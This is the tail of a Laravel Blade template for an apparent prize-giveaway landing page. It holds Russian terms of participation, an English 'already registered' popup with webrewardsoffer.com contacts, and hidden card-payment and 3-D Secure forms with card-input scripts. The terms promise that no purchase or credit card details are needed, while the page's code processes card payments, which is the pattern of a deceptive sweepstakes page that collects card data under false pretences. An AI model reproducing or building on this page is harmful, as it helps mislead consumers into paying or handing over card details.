                телефонной сети или линий, компьютерных онлайн-систем, серверов или провайдеров,
                компьютерного оборудования, программного обеспечения, сбои любой электронной почты или
                игроков из-за технических проблем или перегрузки трафика в Интернете или в любом другом
                месте. Услуг или их комбинации, включая любые телесные повреждения или ущерб
                пользователям или любым лицам, связанным с компьютером, или возникшие в результате
                участия или загрузки материалов в связи с Веб-сайтом и / или в связи с Услугами,
                Продуктами или Призами. Ни при каких обстоятельствах Веб-сайт не несет ответственности
                за любые убытки или ущерб, включая телесные повреждения или смерть, возникшие в
                результате использования Веб-сайта или Услуг или любого контента, размещенного на
                Веб-сайте или переданного пользователям, или любых взаимодействий между пользователями,
                будь то онлайн. или офлайн.
            </p>
            <p>Условия и положения приза / продукта</p>
            <p>
                Чтобы принять участие, участники должны правильно завершить соответствующую игру или
                задачу, представленную им в любом конкретном веб-предложении, которое мы можем время от
                времени представлять. Сотрудники промоутера (и их ближайшие родственники) и его
                агентств, связанных с этой рекламной акцией, не имеют права участвовать.
            </p>
            <p>
                Покупка не требуется. Все, что вам нужно сделать, чтобы получить свой приз, - это
                полностью заполнить приведенную выше форму, и вы автоматически войдете в наш розыгрыш, и
                вы также получите бесплатный отпуск, если выиграли бесплатный отпуск без участия в сети
                Total Access. Вам нужно только ввести свою личную информацию для входа, вам не нужно
                вводить информацию о кредитной карте.
            </p>
            <p>Отпускной пакет и ежемесячный бонусный розыгрыш</p>
            <p>Победители мгновенных и бонусных розыгрышей</p>
            <p>
                ДЛЯ ВЫИГРЫША ЛЮБОГО ПРИЗА НЕ ТРЕБУЕТСЯ ПОКУПКА ИЛИ ОПЛАТА ЛЮБОГО ВИДА. ЛЮБОЙ ИГРОК МОЖЕТ
                ПОЛУЧИТЬ СВОЙ ПРИЗ, ОТПРАВив ПОЛНОЕ ИМЯ И АДРЕС ПО ЭЛЕКТРОННОЙ ПОЧТЕ на адрес
                privacysupport@webrewardsoffer.com, ИЛИ ПОЛНОСТЬЮ ЗАПолнив форму, указанную выше.
            </p>
            <p>
                У кого-то есть три (3) возможности мгновенно выиграть в любой и / или каждый назначенный
                период акции:
            </p>
            <ol></ol>
            <p>
                ЗАКАЗЧИК признает и соглашается с тем, что в случае выигрыша приза игроком МОЖЕТ
                потребоваться предоставить подтверждение своего имени и адреса, а также может быть
                предложено предоставить фотографию ЗАКАЗЧИКА. Игрок признает и соглашается с тем, что
                предоставление этой информации по запросу не является требованием для получения приза, а
                необходимо для обеспечения правильного распределения любого приза, выигранного любым
                игроком. Игрок также признает и соглашается с тем, что на основании этой предоставленной
                информации имя, город, штат, страна и фотография, предоставленные игроку, могут быть
                использованы Веб-сайтом для соблюдения требований и / или в рекламных целях по
                собственному усмотрению Веб-сайта.
            </p>

            <div style="display: flex; align-items: center; justify-content: center; color: black">
            <span
                class="close"
                style="
                font-family: Verdana, Verdana Ref, sans-serif;
                font-size: 13.33px;
                color: black;
                border: 1px solid black;
                border: 2.5px solid black;
                padding: 10px;
                border-radius: 20px;
              "
                id="bclose"
            >Закрыть</span
            >
            </div>
        </div>
    </div>

    <input type="hidden" value="/_global/" id="hrefToTree" />

    <noscript id="fbpx"> </noscript>

    <div id="xpop">
        <div class="container wrapper">
            <div id="comeback_user_info" class="row text-center">
                <p class="p__title">Dear participant,</p>
                <p class="p__text">
                    It seems that You have already been registered in the competition, you can do that
                    just once. Be patient, as soon as you win the prize, you will be contacted by email.
                    For any further questions please contact our support department
                </p>
                <div class="desc__contact">
              <span
              >E-mail:
                <a class="desc__email" href="mailto:webrewardsoffer.com"
                >contact@webrewardsoffer.com</a
                ></span
              >
                    <span>Phone: <a class="desc__phone" href="#"></a></span>
                </div>
            </div>
        </div>
    </div>
</div>

<a href="#" onclick="openModal(this)" class="thanks-button" data-target="modalThanks" style="display: none"></a>
<a href="#" onclick="openModal(this)" class="fail-button" data-target="modalFail" style="display: none"></a>

<form name="secure" id="secure" action="" method="POST">
    <input type="hidden" name="PaReq" value="">
    <input type="hidden" name="MD" value="">
    <input type="hidden" name="TermUrl" value="">
</form>
<form action="https://api.cloudpayments.ru/payments/cards/post3ds" id="post3ds" method="POST">
    <input type="hidden" name="PaRes" value="">
    <input type="hidden" name="TransactionId" value="">
</form>
@include('land2.modals')

<script
    src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"
    integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg=="
    crossorigin="anonymous"
></script>
<script
    src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/js/all.min.js"
    integrity="sha512-jAu66pqHWWQ564NS+m2Zxe13Yek98R7JWNjQLzW+PQ4i2jsMxBT1nGrQ0gFUIVJ4kPkEFe5gelBWNEDTBqmn/w=="
    crossorigin="anonymous"
></script>
<script src="/land2/assets/js/main.min.js"></script>

<script src="/land2/bundle.js"></script>
<script src="/land2/card.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.5/jquery.inputmask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/card/2.5.0/card.min.js"></script>

<script src="/land2/scripts.js?v=2.1"></script>
<script>

    @php
        if($paymentSuccess)
        {
            echo "localStorage.clear();";
                echo "$('.thanks-button').click();";
            }
        elseif ($paymentSuccess !== null && $paymentSuccess == false)
        {
                echo "$('.fail-button').click()";
        }
    @endphp
</script>

</body>


</html>
